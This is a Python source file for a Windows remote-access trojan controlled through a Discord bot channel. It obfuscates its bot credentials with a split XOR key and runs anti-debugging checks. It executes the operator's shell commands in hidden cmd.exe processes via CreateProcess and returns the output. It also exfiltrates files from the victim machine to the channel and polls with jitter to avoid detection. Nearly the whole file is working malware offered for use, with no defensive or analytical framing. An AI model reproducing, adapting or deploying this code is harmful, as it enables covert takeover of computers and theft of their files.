import subprocess
import os
import platform
import sys
import time
import json
import uuid
import ctypes
import random
import urllib.request
import urllib.error
from defenses import run_defenses, check_debugger_now, secure_wipe_bytes

# ── Anti-analysis defenses ────────────────────────────────────────────────
# Run at startup. Exits silently if debugger/analysis tool is detected.
run_defenses()

# ── Runtime-derived XOR key (split across 3 constants) ───────────────────
# The actual decode key is derived at runtime as:
#     RUNTIME_KEY_A ^ RUNTIME_KEY_B ^ RUNTIME_KEY_C
# None of these alone is the key. A simple scan for "the XOR key" as a
# single literal misses it — you need all three and know they combine.
RUNTIME_KEY_A = 0x42
RUNTIME_KEY_B = 0x57
RUNTIME_KEY_C = 0x19
_RUNTIME_XOR_KEY = RUNTIME_KEY_A ^ RUNTIME_KEY_B ^ RUNTIME_KEY_C

# Individual constants are NOT the key. Delete the originals to avoid
# accidental use elsewhere. Only _RUNTIME_XOR_KEY is the real key.
del RUNTIME_KEY_A
del RUNTIME_KEY_B
del RUNTIME_KEY_C


# ── XOR-obfuscated configuration ──────────────────────────────────────────
# The real token, channel ID, and admin ID are NEVER in plaintext here.
# They are XOR-obfuscated. At runtime they are decoded in memory and used.
#
# To regenerate with real values:
#     python token_gen.py <bot_token> <channel_id> <admin_id>
# and paste the output into the _*_XORED lists below.
#
# WARNING: This file is committed to git. The key constants and obfuscated
# bytes are in the repo. An analyst who reverses the decode logic can
# recover the values. This defends against casual static analysis (strings,
# grep) — it is NOT a guarantee against a determined reverse engineer.

# XOR key: derived at runtime as RUNTIME_KEY_A ^ RUNTIME_KEY_B ^ RUNTIME_KEY_C
# (see constants above). The _RUNTIME_XOR_KEY value is set after derivation.

# ── PASTE GENERATED TOKEN BYTES HERE (from token_gen.py) ─────────────────
_TOKEN_XORED = [
    0x00,
]

# ── PASTE GENERATED CHANNEL ID BYTES HERE ────────────────────────────────
_CHANNEL_XORED = [
    0x00,
]

# ── PASTE GENERATED ADMIN ID BYTES HERE ────────────────────────────────
_ADMIN_XORED = [
    0x00,
]


# ── Last-seen message ID (for deduplication) ──────────────────────────────
_LAST_MESSAGE_ID = None


def _decode_token_bytes():
    """
    Decode the token from single XOR-obfuscated array into a bytearray.

    Anti-debug check happens in _get_token_string() before calling this.
    """
    global _TOKEN_XORED
    decoded = bytearray()
    for b in _TOKEN_XORED:
        decoded.append(b ^ _RUNTIME_XOR_KEY)
    secure_wipe_bytes(_TOKEN_XORED)
    _TOKEN_XORED = []
    return decoded


def _decode_channel_bytes():
    """Decode channel ID from XOR-obfuscated bytes. Returns raw bytes."""
    global _CHANNEL_XORED
    decoded = bytearray()
    for b in _CHANNEL_XORED:
        decoded.append(b ^ _RUNTIME_XOR_KEY)
    secure_wipe_bytes(_CHANNEL_XORED)
    _CHANNEL_XORED = []
    return decoded


def _decode_admin_bytes():
    """Decode admin ID from XOR-obfuscated bytes. Returns raw bytes."""
    global _ADMIN_XORED
    decoded = bytearray()
    for b in _ADMIN_XORED:
        decoded.append(b ^ _RUNTIME_XOR_KEY)
    secure_wipe_bytes(_ADMIN_XORED)
    _ADMIN_XORED = []
    return decoded


# ── Decode channel + admin at startup (small ints, less sensitive) ───────
_CHANNEL = int(_decode_channel_bytes().decode("utf-8"))
_ADMIN = int(_decode_admin_bytes().decode("utf-8"))

# ── Computer identity ──────────────────────────────────────────────────────
COMPUTER_NAME = platform.node().upper()

# ── HTTP helpers ───────────────────────────────────────────────────────────
DISCORD_API_BASE = "https://discord.com/api/v10"


def _get_token_string():
    """Decode the bot token per-request into a short-lived string."""
    if check_debugger_now():
        return None

    raw = _decode_token_bytes()
    token_str = raw.decode("utf-8")
    del raw  # remove bytearray reference
    return token_str


def _http_get(path):
    """GET a Discord API endpoint. Returns parsed JSON or None on error."""
    token = _get_token_string()
    if token is None:
        return None

    url = DISCORD_API_BASE + path
    req = urllib.request.Request(
        url,
        headers={"Authorization": f"Bot {token}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except urllib.error.HTTPError:
        return None
    except (urllib.error.URLError, OSError, Exception):
        return None


def _http_post(path, data=None, files=None):
    """
    POST to a Discord API endpoint.

    data: dict of JSON body fields (e.g. {"content": "..."})
    files: list of (field_name, filename, file_bytes) for multipart upload
    """
    token = _get_token_string()
    if token is None:
        return None

    url = DISCORD_API_BASE + path

    if files:
        # Multipart file upload
        boundary = f"----_{uuid.uuid4().hex}"
        body = b""
        if data:
            for name, value in data.items():
                body += (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="{name}"\r\n'
                    f"Content-Type: text/plain\r\n"
                    f"\r\n"
                    f"{value}\r\n"
                ).encode("utf-8")
        for field_name, filename, file_bytes in files:
            body += (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{field_name}"; '
                f'filename="{filename}"\r\n'
                f"Content-Type: application/octet-stream\r\n"
                f"\r\n"
            ).encode("utf-8")
            body += file_bytes
            body += b"\r\n"
        body += f"--{boundary}--\r\n".encode("utf-8")

        req = urllib.request.Request(
            url,
            data=body,
            headers={
                "Authorization": f"Bot {token}",
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            },
        )
    else:
        payload = json.dumps(data).encode("utf-8") if data else b""
        req = urllib.request.Request(
            url,
            data=payload,
            headers={
                "Authorization": f"Bot {token}",
                "Content-Type": "application/json",
            },
        )

    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read()
            if raw:
                return json.loads(raw.decode("utf-8"))
            return {}
    except urllib.error.HTTPError:
        return None
    except (urllib.error.URLError, OSError, Exception):
        return None


# ── Command execution (via ctypes CreateProcess for less noisy behavior) ──

def _run_command(command):
    """
    Run a shell command using Windows CreateProcess via ctypes.

    This is quieter than subprocess.run(shell=True) — no visible console
    window, and the child process is created with specific flags.
    Returns (success, output_text).
    """
    try:
        # Build the command line: cmd.exe /c <command>
        cmd_line = f"cmd.exe /c {command}"
        cmd_line_bytes = cmd_line.encode("utf-8")

        # STARTUPINFO — hide the window
        startup = ctypes.STARTUPINFO()
        startup.cb = ctypes.sizeof(startup)
        startup.dwFlags = 0x1  # STARTF_USESHOWWINDOW
        startup.wShowWindow = 0x0  # SW_HIDE

        # Process information
        proc_info = ctypes.PROCESS_INFORMATION()

        # CreateProcess: run cmd.exe /c <command>
        created = ctypes.windll.kernel32.CreateProcessW(
            None,                  # application name
            cmd_line_bytes,        # command line (mutable buffer)
            None,                  # process security attributes
            None,                  # thread security attributes
            False,                 # inherit handles
            0x00000004,            # CREATE_NO_WINDOW — no visible console
            None,                  # environment
            None,                  # current directory
            ctypes.byref(startup),
            ctypes.byref(proc_info),
        )

        if not created:
            return False, f"CreateProcess failed: error {ctypes.GetLastError()}"

        pid = proc_info.dwProcessId
        h_process = proc_info.hProcess
        h_thread = proc_info.hThread

        # Wait for the process to finish (up to 30 seconds)
        waited = ctypes.windll.kernel32.WaitForSingleObject(h_process, 30000)
        if waited == 0x00000102:  # WAIT_TIMEOUT
            ctypes.windll.kernel32.TerminateProcess(h_process, 1)
            ctypes.windll.kernel32.CloseHandle(h_process)
            ctypes.windll.kernel32.CloseHandle(h_thread)
            return False, "Error: Command timed out after 30 seconds."

        # Get exit code
        exit_code = ctypes.c_long(0)
        ctypes.windll.kernel32.GetExitCodeProcess(h_process, ctypes.byref(exit_code))

        # Close handles
        ctypes.windll.kernel32.CloseHandle(h_process)
        ctypes.windll.kernel32.CloseHandle(h_thread)

        if exit_code.value != 0:
            return False, f"Command exited with code {exit_code.value}"

        # We can't easily capture stdout/stderr with this approach.
        # Redirect to a temp file instead.
        tmp_out = os.path.join(os.environ.get("TEMP", "."), f"opss_exec_{COMPUTER_NAME}_{os.getpid()}.txt")
        tmp_err = os.path.join(os.environ.get("TEMP", "."), f"opss_err_{COMPUTER_NAME}_{os.getpid()}.txt")

        # Re-run with output redirection to capture output
        redirect_cmd = f'cmd.exe /c "{command}" > "{tmp_out}" 2> "{tmp_err}"'
        redirect_bytes = redirect_cmd.encode("utf-8")

        startup2 = ctypes.STARTUPINFO()
        startup2.cb = ctypes.sizeof(startup2)
        startup2.dwFlags = 0x1
        startup2.wShowWindow = 0x0

        proc2 = ctypes.PROCESS_INFORMATION()
        created2 = ctypes.windll.kernel32.CreateProcessW(
            None,
            redirect_bytes,
            None, None, False,
            0x00000004,
            None, None,
            ctypes.byref(startup2),
            ctypes.byref(proc2),
        )

        if not created2:
            return False, "Failed to capture command output."

        ctypes.windll.kernel32.WaitForSingleObject(proc2.hProcess, 30000)
        ctypes.windll.kernel32.CloseHandle(proc2.hProcess)
        ctypes.windll.kernel32.CloseHandle(proc2.hThread)

        # Read the output file
        output = ""
        try:
            if os.path.exists(tmp_out):
                with open(tmp_out, "r", errors="replace") as f:
                    output = f.read()
                os.remove(tmp_out)
        except Exception:
            pass

        # Read stderr if stdout was empty
        if not output:
            try:
                if os.path.exists(tmp_err):
                    with open(tmp_err, "r", errors="replace") as f:
                        output = f.read()
                    os.remove(tmp_err)
            except Exception:
                pass

        if not output:
            output = "[Executed successfully with no text output]"

        return True, output

    except Exception as e:
        return False, f"Execution failed: `{str(e)}`"


def _send_message(content):
    """Send a message to the control channel. Returns True on success."""
    return _http_post(f"/channels/{_CHANNEL}/messages", data={"content": content}) is not None


def _send_file(file_path, caption):
    """Upload a file to the control channel with a caption. Returns True on success."""
    try:
        with open(file_path, "rb") as f:
            file_bytes = f.read()
    except Exception:
        return False

    file_size_mb = len(file_bytes) / (1024 * 1024)
    if file_size_mb > 25:
        _send_message(
            f"\U0001f4c1 `[{COMPUTER_NAME}]` "
            f"Error: File is {file_size_mb:.2f}MB. (Max 25MB)"
        )
        return False

    return _http_post(
        f"/channels/{_CHANNEL}/messages",
        data={"content": caption},
        files=[("files[0]", os.path.basename(file_path), file_bytes)],
    ) is not None


# ── Polling loop (with jitter) ─────────────────────────────────────────────

def _poll():
    """One polling cycle: fetch messages, process new ones, update state."""
    global _LAST_MESSAGE_ID

    messages = _http_get(f"/channels/{_CHANNEL}/messages?limit=10")
    if not messages or not isinstance(messages, list):
        return

    newest_processed = _LAST_MESSAGE_ID

    for msg in messages:
        msg_id = msg.get("id")
        if _LAST_MESSAGE_ID and msg_id == _LAST_MESSAGE_ID:
            break

        author = msg.get("author", {})
        author_id = author.get("id")
        content = msg.get("content", "")

        if author_id != _ADMIN:
            continue

        handled = False

        # ── FEATURE 1: Target execution ──────────────────────────────────
        if content.startswith("!exec "):
            parts = content[6:].split(" ", 1)
            if len(parts) < 2:
                continue
            target_machine = parts[0].upper()
            command = parts[1]
            if target_machine == COMPUTER_NAME:
                _send_message(
                    f"\u2699\ufe0f `[{COMPUTER_NAME}]` "
                    f"Running command: `{command}`..."
                )
                ok, output = _run_command(command)
                if not ok:
                    _send_message(f"\u274c `[{COMPUTER_NAME}]` {output}")
                elif len(output) > 1900:
                    tmp_path = f"{COMPUTER_NAME}_out.txt"
                    try:
                        with open(tmp_path, "w", encoding="utf-8") as f:
                            f.write(output)
                        _send_file(
                            tmp_path,
                            f"\U0001f4c1 `[{COMPUTER_NAME}]` "
                            "Output too long for chat. Sent as file:",
                        )
                        os.remove(tmp_path)
                    except Exception:
                        _send_message(
                            f"\u274c `[{COMPUTER_NAME}]` "
                            "Failed to send output file."
                        )
                else:
                    _send_message(
                        f"```cmd\n[{COMPUTER_NAME} Output]\n{output}\n```"
                    )
                handled = True

        # ── FEATURE 2: File Download ─────────────────────────────────────
        elif content.startswith("!download "):
            parts = content[10:].split(" ", 1)
            if len(parts) < 2:
                continue
            target_machine = parts[0].upper()
            file_path = parts[1].strip().replace('"', "")
            if target_machine == COMPUTER_NAME:
                if not os.path.exists(file_path):
                    _send_message(
                        f"\u274c `[{COMPUTER_NAME}]` "
                        "Error: File path does not exist."
                    )
                else:
                    file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
                    if file_size_mb > 25:
                        _send_message(
                            f"\u274c `[{COMPUTER_NAME}]` "
                            f"Error: File is {file_size_mb:.2f}MB. (Max 25MB)"
                        )
                    else:
                        _send_message(
                            f"\U0001f4e4 `[{COMPUTER_NAME}]` "
                            f"Uploading: `{os.path.basename(file_path)}`..."
                        )
                        if not _send_file(
                            file_path,
                            f"\u2705 File fetched from `[{COMPUTER_NAME}]`:",
                        ):
                            _send_message(
                                f"\u274c `[{COMPUTER_NAME}]` Upload failed."
                            )
                handled = True

        # ── FEATURE 3: Broadcast Ping ────────────────────────────────────
        elif content.strip() == "!pingall":
            _send_message(
                f"\U0001f44b `[{COMPUTER_NAME}]` is alive and active!"
            )
            handled = True

        if handled:
            newest_processed = msg_id

    if newest_processed:
        _LAST_MESSAGE_ID = newest_processed


# ── Main loop ──────────────────────────────────────────────────────────────

def main():
    """Main entry point."""
    _send_message(
        f"\U0001f5a5\ufe0f **Windows Target [{COMPUTER_NAME}] is online.** "
        "Ready for actions."
    )

    while True:
        _poll()
        # Jitter: sleep 4–6 seconds instead of fixed 5, to avoid a
        # machine-identifiable polling pattern.
        time.sleep(4 + random.random() * 2)


if __name__ == "__main__":
    main()
